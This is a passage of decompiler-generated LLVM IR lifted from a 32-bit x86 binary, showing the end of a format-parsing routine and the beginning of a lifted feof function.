  %v3_8051833 = load i8, i8* %v2_8051833, align 1
  %v4_8051833 = sext i8 %v3_8051833 to i32
  %v2_8051837 = mul nsw i32 %v4_8051833, 256
  store i32 %v2_8051837, i32* %ebx.global-to-local, align 4
  %v1_805183a = inttoptr i32 %v0_805183a to i8*
  %v2_805183a = load i8, i8* %v1_805183a, align 1
  %v3_805183a = zext i8 %v2_805183a to i32
  %v5_805183a = and i32 %v4_805183a, -256
  %v6_805183a = or i32 %v3_805183a, %v5_805183a
  store i32 %v6_805183a, i32* %eax.global-to-local, align 4
  %v4_805183c = icmp eq i8 %v2_805183a, 0
  br i1 %v4_805183c, label %dec_label_pc_80519f0, label %dec_label_pc_8051844

dec_label_pc_8051844:                             ; preds = %dec_label_pc_8051833
  store i32 ptrtoint ([21 x i8]* @global_var_8059355.478 to i32), i32* %ecx.global-to-local, align 4
  %v3_8051849 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051849, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805184d

dec_label_pc_805184d:                             ; preds = %dec_label_pc_805189c, %dec_label_pc_8051844
  %v0_805189c = phi i32 [ %v1_805189c, %dec_label_pc_805189c ], [ ptrtoint ([21 x i8]* @global_var_8059355.478 to i32), %dec_label_pc_8051844 ]
  %v3_805184d = inttoptr i32 %v0_805189c to i8*
  %v4_805184d = load i8, i8* %v3_805184d, align 1
  %v15_805184d = icmp eq i8 %v2_805183a, %v4_805184d
  %v1_805184f = icmp eq i1 %v15_805184d, false
  br i1 %v1_805184f, label %dec_label_pc_805189c, label %dec_label_pc_8051851

dec_label_pc_8051851:                             ; preds = %dec_label_pc_805184d
  %v1_8051853 = add i32 %v0_805189c, -134583125
  store i32 %v1_8051853, i32* %edx.global-to-local, align 4
  %v7_805185c = icmp sgt i32 %v1_8051853, 17
  br i1 %v7_805185c, label %dec_label_pc_805185e, label %dec_label_pc_8051866

dec_label_pc_805185e:                             ; preds = %dec_label_pc_8051851
  %v3_805185e = and i32 %v2_8051837, 1024
  %v4_805185e = icmp eq i32 %v3_805185e, 0
  br i1 %v4_805185e, label %dec_label_pc_8051866, label %dec_label_pc_8051863

dec_label_pc_8051863:                             ; preds = %dec_label_pc_805185e
  %v1_8051863 = add i32 %v0_805189c, -134583127
  store i32 %v1_8051863, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051866

dec_label_pc_8051866:                             ; preds = %dec_label_pc_8051851, %dec_label_pc_805185e, %dec_label_pc_8051863
  %v0_805186f = phi i32 [ %v1_8051853, %dec_label_pc_8051851 ], [ %v1_8051853, %dec_label_pc_805185e ], [ %v1_8051863, %dec_label_pc_8051863 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805934b.479 to i32), i32* %ecx.global-to-local, align 4
  %v2_805186f = add i32 %tmp76, 32
  %v3_805186f = inttoptr i32 %v2_805186f to i32*
  store i32 %v0_805186f, i32* %v3_805186f, align 4
  %v0_8051872.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8051876.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051872

dec_label_pc_8051872:                             ; preds = %dec_label_pc_8051872, %dec_label_pc_8051866
  %v0_8051872 = phi i32 [ %v1_8051872, %dec_label_pc_8051872 ], [ %v0_8051872.pre, %dec_label_pc_8051866 ]
  %v1_8051872 = add i32 %v0_8051872, 1
  store i32 %v1_8051872, i32* %ecx.global-to-local, align 4
  %v1_8051873 = inttoptr i32 %v1_8051872 to i8*
  %v2_8051873 = load i8, i8* %v1_8051873, align 1
  %v3_8051873 = sext i8 %v2_8051873 to i32
  store i32 %v3_8051873, i32* %eax.global-to-local, align 4
  %v8_8051878 = icmp sgt i32 %v0_8051876.pre, %v3_8051873
  br i1 %v8_8051878, label %dec_label_pc_8051872, label %dec_label_pc_805187a

dec_label_pc_805187a:                             ; preds = %dec_label_pc_8051872
  store i32 ptrtoint ([21 x i8]* @global_var_8059355.478 to i32), i32* @ecx, align 4
  %v1_8051881 = add i32 %v0_8051872, -134583115
  store i32 %v1_8051881, i32* %eax.global-to-local, align 4
  %v2_8051886 = add i32 %v0_8051872, add (i32 ptrtoint (i32* @global_var_805933c.480 to i32), i32 -134583115)
  %v3_8051886 = add i32 %v2_8051886, %v1_8051881
  %v4_8051886 = inttoptr i32 %v3_8051886 to i16*
  %v5_8051886 = load i16, i16* %v4_8051886, align 2
  %v6_8051886 = sext i16 %v5_8051886 to i32
  store i32 %v6_8051886, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8051881, 2
  %v3_805188e = add i32 %factor, 134583084
  %v4_805188e = inttoptr i32 %v3_805188e to i16*
  %v5_805188e = load i16, i16* %v4_805188e, align 2
  %v6_805188e = sext i16 %v5_805188e to i32
  store i32 %v6_805188e, i32* %eax.global-to-local, align 4
  %v1_8051896 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051896 = or i32 %v1_8051896, %v6_8051886
  %v2_8051898 = and i32 %v2_8051896, %v6_805188e
  store i32 %v2_8051898, i32* %edx.global-to-local, align 4
  %v0_80518aa.pre = load i32, i32* @esi, align 4
  %v0_80518ad.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80518a2

dec_label_pc_805189c:                             ; preds = %dec_label_pc_805184d
  %v1_805189c = add i32 %v0_805189c, 1
  store i32 %v1_805189c, i32* @ecx, align 4
  %v1_805189d = inttoptr i32 %v1_805189c to i8*
  %v2_805189d = load i8, i8* %v1_805189d, align 1
  %v3_805189d = icmp eq i8 %v2_805189d, 0
  %v1_80518a0 = icmp eq i1 %v3_805189d, false
  br i1 %v1_80518a0, label %dec_label_pc_805184d, label %dec_label_pc_80518a2

dec_label_pc_80518a2:                             ; preds = %dec_label_pc_805189c, %dec_label_pc_805187a
  %v0_80518ad = phi i32 [ %v0_80518ad.pre, %dec_label_pc_805187a ], [ %storemerge4, %dec_label_pc_805189c ]
  %v0_80518aa = phi i32 [ %v0_80518aa.pre, %dec_label_pc_805187a ], [ %v0_805183a, %dec_label_pc_805189c ]
  %v0_80518a2 = phi i32 [ %v2_8051898, %dec_label_pc_805187a ], [ %v3_8051849, %dec_label_pc_805189c ]
  store i32 %v0_80518a2, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80518aa = inttoptr i32 %v0_80518aa to i8*
  %v2_80518aa = load i8, i8* %v1_80518aa, align 1
  %v3_80518aa = sext i8 %v2_80518aa to i32
  store i32 %v3_80518aa, i32* %eax.global-to-local, align 4
  %v2_80518ad = add i32 %tmp76, 4
  %v3_80518ad = inttoptr i32 %v2_80518ad to i32*
  store i32 %v0_80518ad, i32* %v3_80518ad, align 4
  %v0_80518b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80518b0 = load i32, i32* @edx, align 4
  %v2_80518b0 = add i32 %v1_80518b0, 12
  %v3_80518b0 = inttoptr i32 %v2_80518b0 to i32*
  store i32 %v0_80518b0, i32* %v3_80518b0, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_80518b7 = load i32, i32* @edx, align 4
  %v1_80518b7 = add i32 %v0_80518b7, 28
  %v2_80518b7 = inttoptr i32 %v1_80518b7 to i32*
  store i32 1, i32* %v2_80518b7, align 4
  %v0_80518be = load i32, i32* %eax.global-to-local, align 4
  %v1_80518be = load i32, i32* @edx, align 4
  %v2_80518be = add i32 %v1_80518be, 8
  %v3_80518be = inttoptr i32 %v2_80518be to i32*
  store i32 %v0_80518be, i32* %v3_80518be, align 4
  %v0_80518c1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80518cb = and i32 %v0_80518c1, -5
  %v0_80518d1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80518d1 = and i32 %v0_80518d1, 3840
  store i32 %v1_80518d1, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_80518da = or i32 %v1_80518d1, %v1_80518cb
  store i32 %v2_80518da, i32* @edi, align 4
  %v1_80518dc = load i32, i32* @edx, align 4
  %v2_80518dc = add i32 %v1_80518dc, 20
  %v3_80518dc = inttoptr i32 %v2_80518dc to i32*
  store i32 48, i32* %v3_80518dc, align 4
  %v0_80518df = load i32, i32* @edi, align 4
  %v1_80518df = load i32, i32* @edx, align 4
  %v2_80518df = add i32 %v1_80518df, 16
  %v3_80518df = inttoptr i32 %v2_80518df to i32*
  store i32 %v0_80518df, i32* %v3_80518df, align 4
  %v0_80518e2 = load i32, i32* @ecx, align 4
  %v1_80518e2 = inttoptr i32 %v0_80518e2 to i8*
  %v2_80518e2 = load i8, i8* %v1_80518e2, align 1
  %v3_80518e2 = icmp eq i8 %v2_80518e2, 0
  %v1_80518e5 = icmp eq i1 %v3_80518e2, false
  br i1 %v1_80518e5, label %dec_label_pc_80518fe, label %dec_label_pc_80518e7

dec_label_pc_80518e7:                             ; preds = %dec_label_pc_80518a2
  %v0_80518e7 = load i32, i32* @esi, align 4
  %v1_80518e7 = inttoptr i32 %v0_80518e7 to i8*
  %v2_80518e7 = load i8, i8* %v1_80518e7, align 1
  %v11_80518e7 = icmp eq i8 %v2_80518e7, 109
  %v1_80518ea = icmp eq i1 %v11_80518e7, false
  br i1 %v1_80518ea, label %dec_label_pc_80519f0, label %dec_label_pc_80518f0

dec_label_pc_80518f0:                             ; preds = %dec_label_pc_80518e7
  %v0_80518f0 = load i32, i32* @edx, align 4
  %v1_80518f0 = add i32 %v0_80518f0, 32
  %v2_80518f0 = inttoptr i32 %v1_80518f0 to i32*
  store i32 20, i32* %v2_80518f0, align 4
  %v0_80518f7 = load i32, i32* @edx, align 4
  %v1_80518f7 = add i32 %v0_80518f7, 28
  %v2_80518f7 = inttoptr i32 %v1_80518f7 to i32*
  store i32 0, i32* %v2_80518f7, align 4
  br label %dec_label_pc_80518fe

dec_label_pc_80518fe:                             ; preds = %dec_label_pc_80518a2, %dec_label_pc_80518f0
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_8051992, label %dec_label_pc_8051909

dec_label_pc_8051909:                             ; preds = %dec_label_pc_80518fe
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_805194a = add i32 %tmp76, 40
  %v1_8051983 = add i32 %tmp76, 28
  %v2_8051983 = inttoptr i32 %v1_8051983 to i32*
  %v4_8051918 = add i32 %tmp76, 36
  br label %dec_label_pc_805190b

dec_label_pc_805190b:                             ; preds = %dec_label_pc_805197e, %dec_label_pc_8051909
  %v0_8051921 = phi i32 [ 0, %dec_label_pc_8051909 ], [ %v1_8051982, %dec_label_pc_805197e ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051909 ], [ %stack_var_-88.5, %dec_label_pc_805197e ]
  %v1_805190b = add i32 %v0_8051921, -2
  %v6_805190b = sub i32 1, %v0_8051921
  %v7_805190b = and i32 %v6_805190b, %v0_8051921
  %v8_805190b = icmp slt i32 %v7_805190b, 0
  %v9_805190b = icmp eq i32 %v1_805190b, 0
  %v10_805190b = icmp slt i32 %v1_805190b, 0
  %v3_805190e = icmp eq i1 %v10_805190b, %v8_805190b
  %v4_805190e = icmp eq i1 %v9_805190b, false
  %v5_805190e = and i1 %v4_805190e, %v3_805190e
  br i1 %v5_805190e, label %dec_label_pc_8051921, label %dec_label_pc_8051910

dec_label_pc_8051910:                             ; preds = %dec_label_pc_805190b
  store i32 %tmp76, i32* @edx, align 4
  %v0_8051914 = load i32, i32* @esp, align 4
  %v2_8051914 = mul i32 %v0_8051921, 4
  %v3_8051914 = add i32 %v2_8051914, 68
  %v4_8051914 = add i32 %v3_8051914, %v0_8051914
  %v5_8051914 = inttoptr i32 %v4_8051914 to i32*
  %v6_8051914 = load i32, i32* %v5_8051914, align 4
  store i32 %v6_8051914, i32* %eax.global-to-local, align 4
  %v1_8051918 = trunc i32 %v6_8051914 to i8
  %v5_8051918 = add i32 %v4_8051918, %v0_8051921
  %v6_8051918 = inttoptr i32 %v5_8051918 to i8*
  store i8 %v1_8051918, i8* %v6_8051918, align 1
  %v0_805191c = load i32, i32* %eax.global-to-local, align 4
  %v1_805191c = urem i32 %v0_805191c, 256
  br label %dec_label_pc_805192a

dec_label_pc_8051921:                             ; preds = %dec_label_pc_805190b
  %v5_8051923 = add i32 %v0_8051921, %stack_var_-32.3
  store i32 %v5_8051923, i32* %eax.global-to-local, align 4
  %v1_8051927 = add i32 %v5_8051923, -2
  br label %dec_label_pc_805192a

dec_label_pc_805192a:                             ; preds = %dec_label_pc_8051910, %dec_label_pc_8051921
  %v0_805193d = phi i32 [ %v1_805191c, %dec_label_pc_8051910 ], [ %v1_8051927, %dec_label_pc_8051921 ]
  store i32 %v0_805193d, i32* %eax.global-to-local, align 4
  %v5_805192a = sub i32 %v0_805193d, %stack_var_-88.4
  %v11_805192a = xor i32 %v0_805193d, %stack_var_-88.4
  %v12_805192a = xor i32 %v5_805192a, %v0_805193d
  %v13_805192a = and i32 %v12_805192a, %v11_805192a
  %v14_805192a = icmp slt i32 %v13_805192a, 0
  %v15_805192a = icmp eq i32 %v5_805192a, 0
  %v16_805192a = icmp slt i32 %v5_805192a, 0
  %v3_805192e = icmp ne i1 %v16_805192a, %v14_805192a
  %v4_805192e = or i1 %v15_805192a, %v3_805192e
  br i1 %v4_805192e, label %dec_label_pc_805193d, label %dec_label_pc_8051930

dec_label_pc_8051930:                             ; preds = %dec_label_pc_805192a
  %v1_8051930 = add i32 %v0_805193d, -9
  %v6_8051930 = sub i32 8, %v0_805193d
  %v7_8051930 = and i32 %v6_8051930, %v0_805193d
  %v8_8051930 = icmp slt i32 %v7_8051930, 0
  %v9_8051930 = icmp eq i32 %v1_8051930, 0
  %v10_8051930 = icmp slt i32 %v1_8051930, 0
  %v3_8051933 = icmp eq i1 %v10_8051930, %v8_8051930
  %v4_8051933 = icmp eq i1 %v9_8051930, false
  %v5_8051933 = and i1 %v4_8051933, %v3_8051933
  br i1 %v5_8051933, label %dec_label_pc_80519f0, label %dec_label_pc_805193d

dec_label_pc_805193d:                             ; preds = %dec_label_pc_8051930, %dec_label_pc_805192a
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805192a ], [ %v0_805193d, %dec_label_pc_8051930 ]
  %v1_805193d = add i32 %v0_805193d, -1
  store i32 %v1_805193d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_8051946 = load i32, i32* @esp, align 4
  %v1_8051946 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051946 = mul i32 %v1_8051946, 4
  %v3_8051946 = add i32 %v0_8051946, 80
  %v4_8051946 = add i32 %v3_8051946, %v2_8051946
  %v5_8051946 = inttoptr i32 %v4_8051946 to i32*
  %v6_8051946 = load i32, i32* %v5_8051946, align 4
  store i32 %v6_8051946, i32* %edi.global-to-local, align 4
  %v2_805194a = mul i32 %v1_805193d, 4
  %v4_805194a = add i32 %v3_805194a, %v2_805194a
  %v5_805194a = inttoptr i32 %v4_805194a to i32*
  %v6_805194a = load i32, i32* %v5_805194a, align 4
  store i32 %v6_805194a, i32* @eax, align 4
  %v9_805194e = icmp eq i32 %v6_8051946, 8
  br i1 %v9_805194e, label %dec_label_pc_805197e, label %dec_label_pc_8051953

dec_label_pc_8051953:                             ; preds = %dec_label_pc_805193d
  %v9_8051953 = icmp eq i32 %v6_805194a, 8
  br i1 %v9_8051953, label %dec_label_pc_805196e, label %dec_label_pc_8051958

dec_label_pc_8051958:                             ; preds = %dec_label_pc_8051953
  %v12_8051958 = icmp eq i32 %v6_805194a, %v6_8051946
  br i1 %v12_8051958, label %dec_label_pc_805196e, label %dec_label_pc_805195c

dec_label_pc_805195c:                             ; preds = %dec_label_pc_8051958
  %v1_805195c = call i32 @_promoted_size(i32 %v1_805193d)
  store i32 %v1_805195c, i32* %ebx.global-to-local, align 4
  %v0_8051963 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051963, i32* @eax, align 4
  %v1_8051965 = call i32 @_promoted_size(i32 %v1_805193d)
  store i32 %v1_8051965, i32* %eax.global-to-local, align 4
  %v8_805196c = icmp sgt i32 %v1_805195c, %v1_8051965
  br i1 %v8_805196c, label %dec_label_pc_805197e, label %dec_label_pc_805195c.dec_label_pc_805196e_crit_edge

dec_label_pc_805195c.dec_label_pc_805196e_crit_edge: ; preds = %dec_label_pc_805195c
  %v0_8051976.pre = load i32, i32* @esp, align 4
  %v1_8051976.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805196e

dec_label_pc_805196e:                             ; preds = %dec_label_pc_805195c.dec_label_pc_805196e_crit_edge, %dec_label_pc_8051958, %dec_label_pc_8051953
  %v1_8051976 = phi i32 [ %v1_8051976.pre, %dec_label_pc_805195c.dec_label_pc_805196e_crit_edge ], [ %v1_8051946, %dec_label_pc_8051958 ], [ %v1_8051946, %dec_label_pc_8051953 ]
  %v0_8051976 = phi i32 [ %v0_8051976.pre, %dec_label_pc_805195c.dec_label_pc_805196e_crit_edge ], [ %v0_8051946, %dec_label_pc_8051958 ], [ %v0_8051946, %dec_label_pc_8051953 ]
  store i32 %v1_805193d, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_8051976 = mul i32 %v1_8051976, 4
  %v3_8051976 = add i32 %v0_8051976, 80
  %v4_8051976 = add i32 %v3_8051976, %v2_8051976
  %v5_8051976 = inttoptr i32 %v4_8051976 to i32*
  %v6_8051976 = load i32, i32* %v5_8051976, align 4
  store i32 %v6_8051976, i32* %eax.global-to-local, align 4
  store i32 %v6_8051976, i32* %v5_805194a, align 4
  br label %dec_label_pc_805197e

dec_label_pc_805197e:                             ; preds = %dec_label_pc_805195c, %dec_label_pc_805193d, %dec_label_pc_805196e
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051982 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051982 = add i32 %v0_8051982, 1
  store i32 %v1_8051982, i32* %ebp.global-to-local, align 4
  %v3_8051983 = load i32, i32* %v2_8051983, align 4
  %v1_8051986 = add i32 %v3_8051983, 2
  store i32 %v1_8051986, i32* %eax.global-to-local, align 4
  %v5_805198b = icmp slt i32 %v1_8051982, %v1_8051986
  br i1 %v5_805198b, label %dec_label_pc_805190b, label %dec_label_pc_80519b9

dec_label_pc_8051992:                             ; preds = %dec_label_pc_80518fe
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051996 = add i32 %tmp76, 38
  %v2_8051996 = inttoptr i32 %v1_8051996 to i8*
  store i8 1, i8* %v2_8051996, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805199f = add i32 %tmp76, 28
  %v2_805199f = inttoptr i32 %v1_805199f to i32*
  %v3_805199f = load i32, i32* %v2_805199f, align 4
  %v2_80519a2 = mul i32 %v3_805199f, 4
  %v2_80519a6 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80519ad = add i32 %tmp76, 40
  store i32 %v1_80519ad, i32* %eax.global-to-local, align 4
  %v3_80519b1 = inttoptr i32 %v1_80519ad to i16*
  %v4_80519b1 = call i32 @memcpy(i16* %v3_80519b1, i32 %v2_80519a6, i32 %v2_80519a2)
  store i32 %v4_80519b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80519b9

dec_label_pc_80519b9:                             ; preds = %dec_label_pc_805197e, %dec_label_pc_8051992
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051992 ], [ %stack_var_-88.5, %dec_label_pc_805197e ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_8051664, align 4
  %v0_80519c4 = load i32, i32* @ecx, align 4
  %v1_80519c4 = add i32 %v0_80519c4, 16
  %v2_80519c4 = inttoptr i32 %v1_80519c4 to i8*
  %v3_80519c4 = load i8, i8* %v2_80519c4, align 1
  %v5_80519c4 = icmp slt i8 %v3_80519c4, 0
  br i1 %v5_80519c4, label %dec_label_pc_80519d1, label %dec_label_pc_80519ca

dec_label_pc_80519ca:                             ; preds = %dec_label_pc_80519b9
  %v0_80519ca = load i32, i32* @esi, align 4
  %v1_80519ca = add i32 %v0_80519ca, 1
  store i32 %v1_80519ca, i32* %eax.global-to-local, align 4
  %v2_80519cd = inttoptr i32 %v0_80519c4 to i32*
  store i32 %v1_80519ca, i32* %v2_80519cd, align 4
  br label %dec_label_pc_80519e4

dec_label_pc_80519d1:                             ; preds = %dec_label_pc_80519b9
  store i32 %v4_8051638, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80519d9 = load i32, i32* @esi, align 4
  %v2_80519d9 = sub i32 %v0_80519d9, %v4_8051638
  store i32 %v2_80519d9, i32* %esi.global-to-local, align 4
  %v1_80519db = mul i32 %v2_80519d9, 4
  %v2_80519db = add i32 %v1_80519db, 224
  store i32 %v2_80519db, i32* %eax.global-to-local, align 4
  %v2_80519e2 = load i32, i32* %arg1, align 4
  %v4_80519e2 = add i32 %v2_80519e2, %v2_80519db
  store i32 %v4_80519e2, i32* %arg1, align 4
  br label %dec_label_pc_80519e4

dec_label_pc_80519e4:                             ; preds = %dec_label_pc_80519ca, %dec_label_pc_80519d1
  store i32 %tmp76, i32* @edx, align 4
  %v1_80519e8 = add i32 %tmp76, 28
  %v2_80519e8 = inttoptr i32 %v1_80519e8 to i32*
  %v3_80519e8 = load i32, i32* %v2_80519e8, align 4
  store i32 %v3_80519e8, i32* %eax.global-to-local, align 4
  %v1_80519eb = add i32 %v3_80519e8, 2
  br label %dec_label_pc_80519f3

dec_label_pc_80519f0:                             ; preds = %dec_label_pc_8051689, %dec_label_pc_8051723, %dec_label_pc_8051756, %dec_label_pc_80517d1, %dec_label_pc_80517bd, %dec_label_pc_80517b4, %dec_label_pc_8051930, %dec_label_pc_80518e7, %dec_label_pc_8051833
  br label %dec_label_pc_80519f3

dec_label_pc_80519f3:                             ; preds = %dec_label_pc_80519e4, %dec_label_pc_80519f0
  %storemerge6 = phi i32 [ %v1_80519eb, %dec_label_pc_80519e4 ], [ -1, %dec_label_pc_80519f0 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_80519f6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80519f6, i32* @ebx, align 4
  store i32 %v0_8051637, i32* @esi, align 4
  store i32 %v0_8051636, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_8051982, { 0, 2, 1 }
  uselistorder i32 %v1_805193d, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8051930, { 1, 0 }
  uselistorder i32 %v5_805192a, { 1, 2, 0 }
  uselistorder i32 %v0_805193d, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805190b, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051921, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_805189c, { 1, 2, 0 }
  uselistorder i32 %v1_8051872, { 1, 2, 0 }
  uselistorder i32 %v0_805189c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051837, { 1, 0 }
  uselistorder i32 %v1_8051826, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805182f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8051819, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805180f, { 1, 0 }
  uselistorder i32 %v1_80517f1, { 1, 0 }
  uselistorder i32 %v0_805180f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_80517d4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80517cb, { 1, 2, 0 }
  uselistorder i32 %v0_8051791, { 1, 0 }
  uselistorder i32 %v1_8051783, { 1, 0 }
  uselistorder i32 %v1_805177e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_805177c, { 2, 0, 1 }
  uselistorder i32 %v0_805179e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8051739, { 1, 2, 0 }
  uselistorder i32 %v0_8051711, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8051704.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_80516fd.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_8051707, { 1, 2, 0 }
  uselistorder i32 %v6_8051705, { 0, 2, 1 }
  uselistorder i32 %v1_8051704, { 0, 2, 3, 1 }
  uselistorder i32 %v3_80516fd, { 2, 1, 0 }
  uselistorder i32 %v1_80516f5, { 1, 0 }
  uselistorder i32 %v1_80516fd137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_80516ed, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_80516e0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_80516db, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80516b1, { 0, 2, 1 }
  uselistorder i32 %v2_80516a0, { 1, 0 }
  uselistorder i32 %v0_805169e, { 2, 0, 1 }
  uselistorder i32 %v4_8051638, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 30, 29, 31, 32, 34, 33, 44, 42, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134583115, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8059355.478 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80519f3, { 1, 0 }
  uselistorder label %dec_label_pc_80519f0, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_80519e4, { 1, 0 }
  uselistorder label %dec_label_pc_80519b9, { 1, 0 }
  uselistorder label %dec_label_pc_805197e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805192a, { 1, 0 }
  uselistorder label %dec_label_pc_80518fe, { 1, 0 }
  uselistorder label %dec_label_pc_8051866, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051833, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805180a, { 1, 0 }
  uselistorder label %dec_label_pc_80517e1, { 1, 0 }
  uselistorder label %dec_label_pc_80517a8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805174b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051704, { 1, 0 }
  uselistorder label %dec_label_pc_80516f5, { 1, 0 }
  uselistorder label %dec_label_pc_80516eb, { 1, 0 }
  uselistorder label %dec_label_pc_80516d4, { 1, 0 }
  uselistorder label %dec_label_pc_80516d4.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_80519ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_8051a06 = add i32 %tmp5, 52
  %v2_8051a06 = inttoptr i32 %v1_8051a06 to i32*
  %v3_8051a06 = load i32, i32* %v2_8051a06, align 4
  %v1_8051a09 = icmp eq i32 %v3_8051a06, 0
  %v1_8051a0b = icmp eq i1 %v1_8051a09, false
  br i1 %v1_8051a0b, label %dec_label_pc_8051a2c.thread, label %dec_label_pc_8051a32

dec_label_pc_8051a2c.thread:                      ; preds = %entry
  %v2_8051a2c16 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051a43

dec_label_pc_8051a32:                             ; preds = %entry
  %v1_8051a0d = add i32 %tmp5, 56
  store i32 %v12_80519ff, i32* @eax, align 4
  %v2_8051a1c = call i32 @__pthread_return_void(i32 %v12_80519ff, i32 134562611)
  %v1_8051a24 = call i32 @__pthread_return_0(i32 %v1_8051a0d)
  %v0_8051a2c.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a2c = inttoptr i32 %v0_8051a2c.pre to i32*
  %v2_8051a2c = load i32, i32* %v1_8051a2c, align 4
  store i32 %v12_80519ff, i32* @eax, align 4
  %v2_8051a3b = call i32 @__pthread_return_void(i32 %v12_80519ff, i32 1)
  br label %dec_label_pc_8051a43

dec_label_pc_8051a43:                             ; preds = %dec_label_pc_8051a2c.thread, %dec_label_pc_8051a32
  %v0_8051a43 = phi i32 [ %v2_8051a2c, %dec_label_pc_8051a32 ], [ %v2_8051a2c16, %dec_label_pc_8051a2c.thread ]
  %v1_8051a48 = and i32 %v0_8051a43, 4
